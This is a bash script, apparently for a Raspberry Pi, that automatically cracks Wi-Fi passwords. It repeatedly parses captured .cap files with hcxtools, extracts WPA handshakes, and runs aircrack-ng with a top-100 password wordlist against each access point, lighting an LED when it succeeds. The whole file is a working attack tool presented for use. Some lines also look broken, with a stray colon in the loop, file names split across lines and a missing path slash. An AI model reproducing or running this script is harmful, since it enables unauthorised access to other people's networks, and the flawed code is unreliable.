#!/bin/bash

while sleep 60:
do
        for pcap in *.cap
        do echo $pcap
                hcxpcapngtool "$pcap" -o /tmp/eapol.txt --all
                hcxhashtool -i /tmp/eapol.txt --authorized -o /tmp/eapol_valid.
txt
                hcxhash2cap --pmkid-eapol=/tmp/eapol_valid.txt -c /tmp/out-m1m2.
pcap
                for bssid in $(echo 0 | aircrack-ng /tmp/out-m1m2.pcap | grep
'handshake' | grep -v '0 handshake' | awk '{print $2}')
                do
                        if [ -f "/tmp$bssid" ]; then
                                continue
                        fi
                        touch "/tmp$bssid"
                        aircrack-ng -w /home/pi/wpapsk/passwords/top100.txt -b "$bssid"
"/tmp/out-m1m2_$bssid.txt" -1 "$bssid".txt
                        if [ -s "$bssid.txt" ]; then
                                led red on 2> /dev/null
                        fi
                        exit
                done
        done
        rm -f /tmp/eapol.txt
        rm -f /tmp/eapol_valid.txt
        rm -f /tmp/out-m1m2.pcap
done
